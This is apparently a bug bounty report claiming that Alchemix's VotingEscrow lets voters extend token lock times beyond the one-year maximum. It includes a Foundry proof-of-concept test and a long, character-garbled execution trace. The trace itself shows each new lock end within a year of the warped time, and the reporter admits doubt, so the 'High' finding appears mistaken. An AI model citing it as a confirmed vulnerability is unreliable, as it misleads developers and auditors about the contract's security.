# 31382 - \[SC - High] VotingEscrowupdateUnlockTime - Its possible for...

## `VotingEscrow::updateUnlockTime()` - It's possible for voters to update their vote tokens unlock time as many times as they wish beyond the 365 day MAX limit, violating protocol invariant.

Submitted on May 17th 2024 at 20:19:03 UTC by @OxSCSamurai for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31382

Report type: Smart Contract

Report severity: High

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

### Description

### Brief/Intro

`VotingEscrow::updateUnlockTime()` - It's possible for voters to update their vote tokens unlock time as many times as they wish beyond the 365 day MAX limit, violating protocol invariant.

* it's made clear throughout the codebase and protocol docs that the maximum lock period for the NFT tokens is 1 year, i.e. 365 days, however, the bug in the `updateUnlockTime()` function makes it possible to repeatedly call this function(in different `block.timestamp` timestamps) to extend the unlock period almost indefinitely(e.g. extend by `MAXTIME` each time), but at least for almost 2 years it seems, as can be seen from the added `hevm.warp()` lines in the test function further down below.

### Vulnerability Details

The buggy function:

```solidity
    /**
     * @notice Extend the unlock time for `_tokenId`
     * @param _lockDuration New number of seconds until tokens unlock
     * @param _maxLockEnabled Is max lock being enabled
     */
    function updateUnlockTime(uint256 _tokenId, uint256 _lockDuration, bool _maxLockEnabled) external nonreentrant {
        require(_isApprovedOrOwner(msg.sender, _tokenId), "not approved or owner");

        LockedBalance memory _locked = locked[_tokenId];

        // If max lock is enabled set to max time
        // If max lock is being disabled start decay from max time
        // If max lock is disabled and not being enabled, add unlock time to current end
        uint256 unlockTime = _maxLockEnabled ? ((block.timestamp + MAXTIME) / WEEK) * WEEK : _locked.maxLockEnabled
            ? ((block.timestamp + MAXTIME) / WEEK) * WEEK
            : ((block.timestamp + _lockDuration) / WEEK) * WEEK;

        // If max lock is not enabled, require that the lock is not expired
        if (!_locked.maxLockEnabled) require(_locked.end > block.timestamp, "Lock expired");
        require(_locked.amount > 0, "Nothing is locked");
        require(unlockTime >= _locked.end, "Can only increase lock duration");
        require(unlockTime <= block.timestamp + MAXTIME, "Voting lock can be 1 year max");
        // Cannot update token that is in cooldown
        require(_locked.cooldown == 0, "Cannot increase lock duration on token that started cooldown");

        _depositFor(_tokenId, 0, unlockTime, _maxLockEnabled, _locked, DepositType.INCREASE_UNLOCK_TIME);
    }
```

### Impact Details

Impact: High Likelihood: Medium Severity: High

* a potential vote outcome manipulation impact
* if this is indeed a bug and not just my imagination, then I've demonstrated this bug with my first PoC below
* if you confirm that this bug is valid, I will aim to setup a PoC to demonstrate governance vote manipulation impact, which I already tried to do with my second set of PoC tests, and hopefully succeeded, but not 100% sure, please confirm?

### References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/9e14da88d8db05794623d8ab5f449451a10c15ac/src/VotingEscrow.sol#L709-L735>

### Proof of Concept

## PROOF OF CONCEPT (PoC):

### Modified test function:

I modified the existing protocol test for my PoC:

```solidity
    function testUpdateLockDuration() public {
        hevm.startPrank(admin);

        //hevm.warp(block.timestamp); /// @audit added for PoC/testing purposes
        // uint256 tokenId = veALCX.createLock(TOKEN_1, 5 weeks, true);
        uint256 tokenId = veALCX.createLock(TOKEN_1, 52 weeks, false); /// @audit added for PoC/testing purposes

        // uint256 lockEnd = veALCX.lockEnd(tokenId);
        uint256 lockEnd1 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes

        // // Lock end should be max time when max lock is enabled
        // assertEq(lockEnd, maxDuration);
        // assertEq(lockEnd, block.timestamp + 5 weeks); /// @audit added for PoC/testing purposes >>> roughly a 3 day deviation

        // veALCX.updateUnlockTime(tokenId, 1 days, true);

        // lockEnd = veALCX.lockEnd(tokenId);

        // // Lock duration should be unchanged
        // assertEq(lockEnd, maxDuration);

        //veALCX.updateUnlockTime(tokenId, 1 days, false);
        hevm.warp(block.timestamp + 1 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd2 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 2 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd3 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        assertGt(lockEnd2, lockEnd1); /// @audit added for PoC/testing purposes
        assertGt(lockEnd3, lockEnd2); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 3 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 4 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 5 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 6 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 7 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 10 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 20 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 30 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 40 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 50 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 51 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd60 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        assertGt(lockEnd60, lockEnd1); /// @audit added for PoC/testing purposes

        //lockEnd = veALCX.lockEnd(tokenId);

        // Lock duration should be unchanged
        //assertEq(lockEnd, maxDuration);

        // assertEq(lockEnd, maxDuration); /// @audit added for PoC/testing purposes
        // assertEq(lockEnd, block.timestamp + 5 weeks + 1 weeks + 340 days); /// @audit added for PoC/testing purposes
        // assertGt(lockEnd, maxDuration); /// @audit added for PoC/testing purposes

        // Now that max lock is disabled lock duration can be set again
        //hevm.expectRevert(abi.encodePacked("Voting lock can be 1 year max"));

        //veALCX.updateUnlockTime(tokenId, MAXTIME + ONE_WEEK, false);

        //hevm.warp(block.timestamp + 260 days);

        //lockEnd = veALCX.lockEnd(tokenId);

        // Able to increase lock end now that previous lock end is closer
        //veALCX.updateUnlockTime(tokenId, 200 days, false);

        // Updated lock end should be greater than previous lockEnd
        //assertGt(veALCX.lockEnd(tokenId), lockEnd);

        hevm.stopPrank();
    }
```

#### Test1 Result:

Main test result proving its possible to update/extend the lock period many times past the 365 day limit:

```solidity
make test_file_debug_test FILE=VotingEscrow TEST=testUpdateLockDuration
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/blahblahblah --match-path src/test/VotingEscrow.t.sol --match-test testUpdateLockDuration -vvvvv
[â °] Compiling...
[â ] Compiling 130 files with Solc 0.8.15
[â °] Solc 0.8.15 finished in 136.58s
.
.
. /// skipping unnecessary parts of test results
.
.
.
  [24759683] VotingEscrowTest::testUpdateLockDuration()
    ââ€ [0] VM::startPrank(0x8392F6669292fA56123F71949B52d883aE57e225)
    â   ââ€ â [Return] 
    ââ€ [1185617] VotingEscrow::createLock(1000000000000000000 [1e18], 31449600 [3.144e7], false)
    â   ââ€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1)
    â   ââ€ [33059] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::transferFrom(0x8392F6669292fA56123F71949B52d883aE57e225, RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], 1000000000000000000 [1e18])
    â   â   ââ€ emit Transfer(from: 0x8392F6669292fA56123F71949B52d883aE57e225, to: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], value: 1000000000000000000 [1e18])
    â   â   ââ€ â [Return] true
    â   ââ€ [621222] RewardPoolManager::depositIntoRewardPool(1000000000000000000 [1e18])
    â   â   ââ€ [24673] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::approve(0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, 1000000000000000000 [1e18])
    â   â   â   ââ€ emit Approval(owner: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], spender: 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, value: 1000000000000000000 [1e18])
    â   â   â   ââ€ â [Return] true
    â   â   ââ€ [586446] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::deposit(1000000000000000000 [1e18], RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55])
    â   â   â   ââ€ [28425] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::transferFrom(RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, 1000000000000000000 [1e18])
    â   â   â   â   ââ€ emit Transfer(from: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], to: 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, value: 1000000000000000000 [1e18])
    â   â   â   â   ââ€ emit Approval(owner: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], spender: 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, value: 0)
    â   â   â   â   ââ€ â [Return] true
    â   â   â   ââ€ [2490] 0x9A9eb8236dF12dED723477c8f5797Ac725683f09::balanceOf(0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7) [staticcall]
    â   â   â   â   ââ€ â [Return] 125966981204441603064877 [1.259e23]
    â   â   â   ââ€ [415287] 0xA57b8d98dAE62B26Ec3bcC4a365338157060B234::deposit(74, 1000000000000000000 [1e18], false)
    â   â   â   â   ââ€ [28259] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::transferFrom(0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, 1000000000000000000 [1e18])
    â   â   â   â   â   ââ€ emit Transfer(from: 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, to: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, value: 1000000000000000000 [1e18])
    â   â   â   â   â   ââ€ â [Return] true
    â   â   â   â   ââ€ [343110] 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2::deposit(0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc, 0x183D73dA7adC5011EC3C46e33BB50271e59EC976)
    â   â   â   â   â   ââ€ [656] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::balanceOf(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2) [staticcall]
    â   â   â   â   â   â   ââ€ â [Return] 1000000000000000000 [1e18]
    â   â   â   â   â   ââ€ [4773] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::approve(0x183D73dA7adC5011EC3C46e33BB50271e59EC976, 0)
    â   â   â   â   â   â   ââ€ emit Approval(owner: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, spender: 0x183D73dA7adC5011EC3C46e33BB50271e59EC976, value: 0)
    â   â   â   â   â   â   ââ€ â [Return] true
    â   â   â   â   â   ââ€ [1012] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::allowance(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, 0x183D73dA7adC5011EC3C46e33BB50271e59EC976) [staticcall]
    â   â   â   â   â   â   ââ€ â [Return] 0
    â   â   â   â   â   ââ€ [22573] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::approve(0x183D73dA7adC5011EC3C46e33BB50271e59EC976, 1000000000000000000 [1e18])
    â   â   â   â   â   â   ââ€ emit Approval(owner: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, spender: 0x183D73dA7adC5011EC3C46e33BB50271e59EC976, value: 1000000000000000000 [1e18])
    â   â   â   â   â   â   ââ€ â [Return] true
    â   â   â   â   â   ââ€ [300299] 0x183D73dA7adC5011EC3C46e33BB50271e59EC976::deposit(1000000000000000000 [1e18])
    â   â   â   â   â   â   ââ€ [297630] 0xe5F96070CA00cd54795416B1a4b4c2403231c548::deposit(1000000000000000000 [1e18]) [delegatecall]
    â   â   â   â   â   â   â   ââ€ [2344] 0xf302f9F50958c5593770FDf4d4812309fF77414f::rate() [staticcall]
    â   â   â   â   â   â   â   â   ââ€ â [Return] 0x000000000000000000000000000000000000000000000000025a48bdacafee1f
    â   â   â   â   â   â   â   ââ€ [2702] 0xf302f9F50958c5593770FDf4d4812309fF77414f::future_epoch_time_write()
    â   â   â   â   â   â   â   â   ââ€ â [Return] 0x0000000000000000000000000000000000000000000000000000000067e52fe3
    â   â   â   â   â   â   â   ââ€ [88311] 0xC128468b7Ce63eA702C1f104D55A2566b13D3ABD::checkpoint_gauge(0x183D73dA7adC5011EC3C46e33BB50271e59EC976)
    â   â   â   â   â   â   â   â   ââ€ â [Stop] 
    â   â   â   â   â   â   â   ââ€ [7706] 0xC128468b7Ce63eA702C1f104D55A2566b13D3ABD::gauge_relative_weight(0x183D73dA7adC5011EC3C46e33BB50271e59EC976, 1715212800 [1.715e9]) [staticcall]
    â   â   â   â   â   â   â   â   ââ€ â [Return] 0x000000000000000000000000000000000000000000000000004189720d9d10a9
    â   â   â   â   â   â   â   ââ€ [33986] 0x6f5a2eE11E7a772AeB5114A20d0D7c0ff61EB8A0::adjusted_balance_of(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2) [staticcall]
    â   â   â   â   â   â   â   â   ââ€ [28611] 0x67F8DF125B796B05895a6dc8Ecf944b9556ecb0B::adjusted_balance_of(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2) [staticcall]
    â   â   â   â   â   â   â   â   â   ââ€ [11667] 0xC128a9954e6c874eA3d62ce62B468bA073093F25::balanceOf(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2) [staticcall]
    â   â   â   â   â   â   â   â   â   â   ââ€ â [Return] 3527963892252084745613915 [3.527e24]
    â   â   â   â   â   â   â   â   â   ââ€ â [Return] 0x00000000000000000000000000000000000000000002eb134e4a51780ce9325b
    â   â   â   â   â   â   â   â   ââ€ â [Return] 0x00000000000000000000000000000000000000000002eb134e4a51780ce9325b
    â   â   â   â   â   â   â   ââ€ [12021] 0xC128a9954e6c874eA3d62ce62B468bA073093F25::totalSupply() [staticcall]
    â   â   â   â   â   â   â   â   ââ€ â [Return] 5309514394305342273004220 [5.309e24]
    â   â   â   â   â   â   â   ââ€ emit UpdateLiquidityLimit(param0: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, param1: 125967981204441603064877 [1.259e23], param2: 129391759097357383045823 [1.293e23], param3: 101972639302306159433148 [1.019e23], param4: 103342233876254996805522 [1.033e23])
    â   â   â   â   â   â   â   ââ€ [11325] 0xf16aEe6a71aF1A9Bc8F56975A4c2705ca7A782Bc::transferFrom(0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, 0x183D73dA7adC5011EC3C46e33BB50271e59EC976, 1000000000000000000 [1e18])
    â   â   â   â   â   â   â   â   ââ€ emit Transfer(from: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, to: 0x183D73dA7adC5011EC3C46e33BB50271e59EC976, value: 1000000000000000000 [1e18])
    â   â   â   â   â   â   â   â   ââ€ emit Approval(owner: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, spender: 0x183D73dA7adC5011EC3C46e33BB50271e59EC976, value: 0)
    â   â   â   â   â   â   â   â   ââ€ â [Return] true
    â   â   â   â   â   â   â   ââ€ emit Deposit(param0: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, param1: 1000000000000000000 [1e18])
    â   â   â   â   â   â   â   ââ€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xaF52695E1bB01A16D33D7194C28C42b10e0Dbec2, value: 1000000000000000000 [1e18])
    â   â   â   â   â   â   â   ââ€ â [Stop] 
    â   â   â   â   â   â   ââ€ â [Return] 
    â   â   â   â   â   ââ€ â [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    â   â   â   â   ââ€ [2914] 0xaA64b5Cd233302C2f50D99BfB0F1B3De7E62cD91::stashRewards()
    â   â   â   â   â   ââ€ [248] 0x4A53301Fe213ECA70f904cD3766C07DB3A621bF8::stashRewards() [delegatecall]
    â   â   â   â   â   â   ââ€ â [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    â   â   â   â   â   ââ€ â [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    â   â   â   â   ââ€ [12757] 0x9A9eb8236dF12dED723477c8f5797Ac725683f09::mint(0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, 1000000000000000000 [1e18])
    â   â   â   â   â   ââ€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7, value: 1000000000000000000 [1e18])
    â   â   â   â   â   ââ€ â [Stop] 
    â   â   â   â   ââ€  emit topic 0: 0x73a19dd210f1a7f902193214c0ee91dd35ee5b4d920cba8d519eca65a7b488ca
    â   â   â   â   â       topic 1: 0x0000000000000000000000008b227e3d50117e80a02cd0c67cd6f89a8b7b46d7
    â   â   â   â   â       topic 2: 0x000000000000000000000000000000000000000000000000000000000000004a
    â   â   â   â   â           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    â   â   â   â   ââ€ â [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    â   â   â   ââ€ [490] 0x9A9eb8236dF12dED723477c8f5797Ac725683f09::balanceOf(0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7) [staticcall]
    â   â   â   â   ââ€ â [Return] 125967981204441603064877 [1.259e23]
    â   â   â   ââ€ [41661] 0xF6491119E87712Cd243CA8CE238cDf259E078ECd::stake(RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], 1000000000000000000 [1e18])
    â   â   â   â   ââ€ [402] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::totalSupply() [staticcall]
    â   â   â   â   â   ââ€ â [Return] 125966981204441603064877 [1.259e23]
    â   â   â   â   ââ€ [402] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::totalSupply() [staticcall]
    â   â   â   â   â   ââ€ â [Return] 125966981204441603064877 [1.259e23]
    â   â   â   â   ââ€ [402] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::totalSupply() [staticcall]
    â   â   â   â   â   ââ€ â [Return] 125966981204441603064877 [1.259e23]
    â   â   â   â   ââ€ [402] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::totalSupply() [staticcall]
    â   â   â   â   â   ââ€ â [Return] 125966981204441603064877 [1.259e23]
    â   â   â   â   ââ€ [599] 0x8B227E3D50117E80a02cd0c67Cd6F89A8b7B46d7::balanceOf(RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55]) [staticcall]
    â   â   â   â   â   ââ€ â [Return] 0
    â   â   â   â   ââ€ emit Staked(user: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], amount: 1000000000000000000 [1e18])
    â   â   â   â   ââ€ â [Stop] 
    â   â   â   ââ€ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], value: 1000000000000000000 [1e18])
    â   â   â   ââ€ emit Deposit(caller: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], owner: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], assets: 1000000000000000000 [1e18], shares: 1000000000000000000 [1e18])
    â   â   â   ââ€ emit Staked(user: RewardPoolManager: [0x2e74DFA941b12041781A67Cc2a0326e54DE67c55], amount: 1000000000000000000 [1e18])
    â   â   â   ââ€ â [Return] 1000000000000000000 [1e18]
    â   â   ââ€ â [Return] true
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 1000000000000000000 [1e18], locktime: 1746662400 [1.746e9], maxLockEnabled: false, depositType: 1, ts: 1715554115 [1.715e9])
    â   ââ€ emit Supply(prevSupply: 0, supply: 1000000000000000000 [1e18])
    â   ââ€ â [Return] 1
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1746662400 [1.746e9]
    ââ€ [0] VM::warp(1716158915 [1.716e9])
    â   ââ€ â [Return] 
    ââ€ [316310] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1747267200 [1.747e9], maxLockEnabled: false, depositType: 2, ts: 1716158915 [1.716e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1747267200 [1.747e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1747267200 [1.747e9]
    ââ€ [0] VM::warp(1717368515 [1.717e9])
    â   ââ€ â [Return] 
    ââ€ [404575] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1748476800 [1.748e9], maxLockEnabled: false, depositType: 2, ts: 1717368515 [1.717e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1748476800 [1.748e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1748476800 [1.748e9]
    ââ€ [0] VM::warp(1719182915 [1.719e9])
    â   ââ€ â [Return] 
    ââ€ [496840] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1750291200 [1.75e9], maxLockEnabled: false, depositType: 2, ts: 1719182915 [1.719e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1750291200 [1.75e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1721602115 [1.721e9])
    â   ââ€ â [Return] 
    ââ€ [589105] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1752710400 [1.752e9], maxLockEnabled: false, depositType: 2, ts: 1721602115 [1.721e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1752710400 [1.752e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1724626115 [1.724e9])
    â   ââ€ â [Return] 
    ââ€ [681370] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1755734400 [1.755e9], maxLockEnabled: false, depositType: 2, ts: 1724626115 [1.724e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1755734400 [1.755e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1728254915 [1.728e9])
    â   ââ€ â [Return] 
    ââ€ [773635] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1759363200 [1.759e9], maxLockEnabled: false, depositType: 2, ts: 1728254915 [1.728e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1759363200 [1.759e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1732488515 [1.732e9])
    â   ââ€ â [Return] 
    ââ€ [865900] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1763596800 [1.763e9], maxLockEnabled: false, depositType: 2, ts: 1732488515 [1.732e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1763596800 [1.763e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1738536515 [1.738e9])
    â   ââ€ â [Return] 
    ââ€ [1142695] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1769644800 [1.769e9], maxLockEnabled: false, depositType: 2, ts: 1738536515 [1.738e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1769644800 [1.769e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1750632515 [1.75e9])
    â   ââ€ â [Return] 
    ââ€ [2057345] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1781740800 [1.781e9], maxLockEnabled: false, depositType: 2, ts: 1750632515 [1.75e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1781740800 [1.781e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1768776515 [1.768e9])
    â   ââ€ â [Return] 
    ââ€ [2979995] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1799884800 [1.799e9], maxLockEnabled: false, depositType: 2, ts: 1768776515 [1.768e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1799884800 [1.799e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1792968515 [1.792e9])
    â   ââ€ â [Return] 
    ââ€ [3906645] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1824076800 [1.824e9], maxLockEnabled: false, depositType: 2, ts: 1792968515 [1.792e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1824076800 [1.824e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1823208515 [1.823e9])
    â   ââ€ â [Return] 
    ââ€ [4831295] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1854316800 [1.854e9], maxLockEnabled: false, depositType: 2, ts: 1823208515 [1.823e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1854316800 [1.854e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1854053315 [1.854e9])
    â   ââ€ â [Return] 
    ââ€ [4923560] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1885161600 [1.885e9], maxLockEnabled: false, depositType: 2, ts: 1854053315 [1.854e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1885161600 [1.885e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
